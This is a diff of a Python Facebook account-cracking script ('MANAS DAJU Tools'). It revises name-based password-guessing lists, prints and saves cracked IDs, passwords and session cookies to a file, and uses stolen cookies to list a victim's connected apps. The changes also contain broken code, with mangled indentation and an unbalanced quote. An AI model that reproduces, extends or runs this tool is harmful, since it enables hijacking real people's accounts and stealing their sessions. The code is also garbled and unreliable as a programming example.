@@ -209,7 +209,7 @@ logo ="""
 os.system('clear')
 print(logo)
 os.system('espeak -a 300 " Enter,  Your,   Real,  Name,"')
-uname =input('\033[1;97m[\033[1;92m•]\x1b[38;5;231m WHAT IS YOUR NAME : \x1b[38;5;231m')
+uname =input('\033[1;97m[\033[1;92m•]\033[1;97m WHAT IS YOUR NAME : \x1b[38;5;231m')
 os.system('espeak -a 300 " Welcome,   to,  MANAS,  DAJU,  Tools"')
 pass
  
@@ -250,7 +250,7 @@ def login_lagi334():
     except Exception as e:
         os.system("rm -f .token.txt")
         os.system("rm -f .cok.txt")
-        os.system("python v3.py")
+        os.system("python v4.py")
         exit()
 
 #------------------[ MENU ]----------------#
@@ -280,7 +280,7 @@ def menu():
         crack_file()
     elif MANAS in ['2','02']:
         os.system('xdg-open https://www.facebook.com/manas2080?mibextid=ZbWKwL')
-        os.system("python v3.py")
+        os.system("python v4.py")
     elif MANAS in ['3','03']:
         result()
     elif MANAS in ['0']:
@@ -526,9 +526,9 @@ def setting():
     else:
         method.append('mobile')
     _jembot_ = input('=>SHOW APKS ( Y/N ) ')
-	if _jembot_ in ['']:
+    	if _jembot_ in ['']:
     print('=>CHOOSE THE CORRECT ONE')
-    back()
+        back()
     elif _jembot_ in ['y','Y','yes','YES','1']:
 		taplikasi.append('yes')
 	else:
@@ -556,17 +556,19 @@ def passwrd():
                 if len(frs)<3:
                     pass
                 else:
-                    pwv.append(nmf+'12')
-                    pwv.append(nmf+'123')
-                    pwv.append(nmf+'1234')
-                    pwv.append(nmf+'12345')
-                    pwv.append(nmf+'@12')
-                    pwv.append(nmf+'@123')
-                    pwv.append(nmf+'@1234')
-                    pwv.append(nmf+'@12345')
+                    pwv.append(nmf)
+                    pwv.append(frs+lst+'123')
+                    pwv.append(frs+lst+'1234')
+                    pwv.append(frs+lst+'12345')
+                    pwv.append(frs+lst+'@12')
+                    pwv.append(frs+lst+'@123')
+                    pwv.append(frs+lst+'@1234')
+                    pwv.append(frs+lst+'@12345')
+                    pwv.append(frs+lst+'@') 
                     pwv.append(frs+lst+'12')
                     pwv.append(frs+'@')
                     pwv.append(frs+'@12')
+                    pwv.append(frs+12')
                     pwv.append(frs+'123')
                     pwv.append(frs+'1234')
                     pwv.append(frs+'12345')
@@ -577,17 +579,19 @@ def passwrd():
                 if len(frs)<3:
                     pwv.append(nmf)
                 else:
-                    pwv.append(nmf+'12')
-                    pwv.append(nmf+'123')
-                    pwv.append(nmf+'1234')
-                    pwv.append(nmf+'12345')
-                    pwv.append(nmf+'@12')
-                    pwv.append(nmf+'@123')
-                    pwv.append(nmf+'@1234')
-                    pwv.append(nmf+'@12345')
-                    pwv.append(frs+'12')
+                    pwv.append(nmf)
+                    pwv.append(frs+lst+'123')
+                    pwv.append(frs+lst+'1234')
+                    pwv.append(frs+lst+'12345')
+                    pwv.append(frs+lst+'@12')
+                    pwv.append(frs+lst+'@123')
+                    pwv.append(frs+lst+'@1234')
+                    pwv.append(frs+lst+'@12345')
+                    pwv.append(frs+lst+'@') 
+                    pwv.append(frs+lst+'12')
                     pwv.append(frs+'@')
                     pwv.append(frs+'@12')
+                    pwv.append(frs+12')
                     pwv.append(frs+'123')
                     pwv.append(frs+'1234')
                     pwv.append(frs+'12345')
@@ -614,7 +618,7 @@ def passwrd():
     print('\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37mCP :\033[0;91m%s '%(cp))
     print('\033[0;91m------------------------------------------')
     woi = input('\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m ENTER TO BACK')
-    os.system("python v3.py")
+    os.system("python v4.py")
     exit()
  
 #--------------------[ METODE-B-API ]-----------------#
@@ -649,7 +653,8 @@ def crack(idf,pwv):
                 ok+=1
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print(f'\r{P}{H} [{time.strftime("%H:%M")}-OK] {idf} │ {pw} {P}')('\n\x1b[1;91m[🍁] COOKIES • \033[0;93m{kuki} ')
+                print(f'\r{P}{H} [{time.strftime("%H:%M")}-OK] {idf} │ {pw} {P}')
+                print(f'\033[1;93m   [🇳🇵] COOKIE (1) \033[1;92m : '+kuki)
                 #os.system#@('espeak -a 300 " MANAS,  Ok,  id"')
                 open('/sdcard/MANAS/MANAS-OK.txt/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
                 break
@@ -702,26 +707,31 @@ def crackfree(idf,pwv):
             time.sleep(31)
     loop+=1
  
-def cek_apk(session,cookie):
-	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":cookie}).text
-	sop = BeautifulSoup(w,"html.parser")
-	x = sop.find("form",method="post")
-	game = [i.text for i in x.find_all("h3")]
-	if len(game)==0:
-		print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi aktif di akun ini.")
-	else:
-		for i in range(len(game)):
-			print("   %s%s. %s%s"%(H,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
-	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":cookie}).text
-	sop = BeautifulSoup(w,"html.parser")
-	x = sop.find("form",method="post")
-	game = [i.text for i in x.find_all("h3")]
-	if len(game)==0:
-		print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi kadaluarsa di akun ini.")
-	else:
-		for i in range(len(game)):
-			print("   %s%s. %s%s"%(K,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
-			
+def cek_apk(session,coki):
+    w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
+    sop = BeautifulSoup(w,"html.parser")
+    x = sop.find("form",method="post")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game)==0:
+        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
+    else:
+        print(f'\r[ðŸŽ®] %s \x1b[1;95m â˜† Your Active Apps â˜†     :{WHITE}'%(GREEN))
+        for i in range(len(game)):
+            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
+        #else:
+            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
+    w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
+    sop = BeautifulSoup(w,"html.parser")
+    x = sop.find("form",method="post")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game)==0:
+        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
+    else:
+        print(f'\r[ðŸŽ®] %s \x1b[1;95m â—‡ Your Expired Apps â—‡    :{WHITE}'%(M))
+        for i in range(len(game)):
+            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
+        else:
+            print('')
 #-----------------------[ SYSTEM-CONTROL ]--------------------#
  
 if __name__=='__main__':
